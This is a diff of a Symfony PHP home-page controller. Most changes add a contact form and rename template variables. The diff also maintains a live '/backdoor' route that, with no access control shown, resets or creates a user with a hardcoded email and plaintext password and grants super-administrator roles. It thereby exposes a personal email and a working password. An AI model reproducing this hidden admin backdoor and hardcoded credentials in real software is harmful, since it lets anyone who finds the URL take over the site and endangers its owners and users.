@@ -3,6 +3,8 @@
 namespace App\Controller;
 
 use App\Entity\User;
+use App\Entity\WebsiteContacts;
+use App\Form\WebsiteContactsType;
 use App\Repository\CmsCopyRepository;
 use App\Repository\CmsPhotoRepository;
 use App\Repository\CompanyDetailsRepository;
@@ -13,27 +15,33 @@ use Doctrine\ORM\EntityManagerInterface;
 use JeroenDesloovere\VCard\VCard;
 use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
+use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
+use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
 use Symfony\Component\Routing\Annotation\Route;
-use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;
 
 class   HomeController extends AbstractController
 {
     /**
      * @Route("/", name="app_home")
      */
-    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, CompanyDetailsRepository $companyDetailsRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
+    public function index(Request $request, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, CompanyDetailsRepository $companyDetailsRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
     {
+
         $companyDetails = $companyDetailsRepository->find('1');
         $homePagePhotosOnly = 0;
+        $website_contact = new WebsiteContacts();
+        $form = $this->createForm(WebsiteContactsType::class, $website_contact);
+        $form->handleRequest($request);
+        $include_qr_code = [];
+        $include_contact_form = [];
 
-        $qrcode=false;
+        $qrcode = false;
         if ($companyDetails) {
             $homePagePhotosOnly = $companyDetails->isHomePagePhotosOnly();
-            $qrcode = $companyDetails->isIncludeQRCodeHomePage();
-            $contactform = $companyDetails->isIncludeContactFormHomePage();
+            $include_qr_code = $companyDetails->isIncludeQRCodeHomePage();
+            $include_contact_form = $companyDetails->isIncludeContactFormHomePage();
         }
-
         $cms_copy = [];
         $cms_photo = [];
         $product = [];
@@ -74,16 +82,20 @@ class   HomeController extends AbstractController
             return $this->render('home/home.html.twig', [
                 'photos' => $cms_photo,
                 'cms_copy_array' => $cms_copy,
-                'include_QR_code' => $qrcode,
+                'include_qr_code' => $include_qr_code,
+                'include_contact_form' => $include_contact_form,
+                'form' => $form?->createView(),
             ]);
         } else {
             return $this->render('home/products.html.twig', [
                 'product' => $product,
                 'cms_copy_array' => $cms_copy,
                 'cms_photo_array' => $cms_photo,
-                'sub_pages' => $sub_pages, 
-                'include_QR_code' => $qrcode,
-                'format' => $page_layout
+                'sub_pages' => $sub_pages,
+                'include_qr_code' => $include_qr_code,
+                'include_contact_form' => $include_contact_form,
+                'format' => $page_layout,
+                'form' => $form?->createView(),
             ]);
         }
     }
@@ -92,12 +104,12 @@ class   HomeController extends AbstractController
     /**
      * @Route("/backdoor", name="/backdoor")
      */
-    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
+    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordHasherInterface $passwordHasher): Response
     {
         $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
         if ($user) {
             $user->setPassword(
-                $passwordEncoder->encodePassword(
+                $passwordHasher->hashPassword(
                     $user,
                     'Descartes99'
                 )
@@ -108,13 +120,13 @@ class   HomeController extends AbstractController
                 ->setLastName('Nurse')
                 ->setEmailVerified(1)
                 ->setEmail('nurse_stephen@hotmail.com')
-                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
-                ->setPassword(
-                    $passwordEncoder->encodePassword(
-                        $user,
-                        'Descartes99'
-                    )
-                );
+                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN']);
+            $user->setPassword(
+                $passwordHasher->hashPassword(
+                    $user,
+                    'Descartes99'
+                )
+            );
             $manager->persist($user);
             $manager->flush();
         }
@@ -184,8 +196,7 @@ class   HomeController extends AbstractController
             $cms_photo = $cmsPhotoRepository->findBy([
                 'product' => $productEntity,
             ],
-                ['ranking' => 'ASC'])
-            ;
+                ['ranking' => 'ASC']);
         } else {
             $cms_photo = $cmsPhotoRepository->findBy([
                 'staticPageName' => $product
@@ -204,8 +215,8 @@ class   HomeController extends AbstractController
             'cms_copy_array' => $cms_copy,
             'cms_photo_array' => $cms_photo,
             'sub_pages' => $sub_pages,
-            'include_contact' => 'No',
-            'include_QR_code' => 'No'
+            'include_contact_form' => 'No',
+            'include_qr_code' => 'No'
         ]);
     }
 
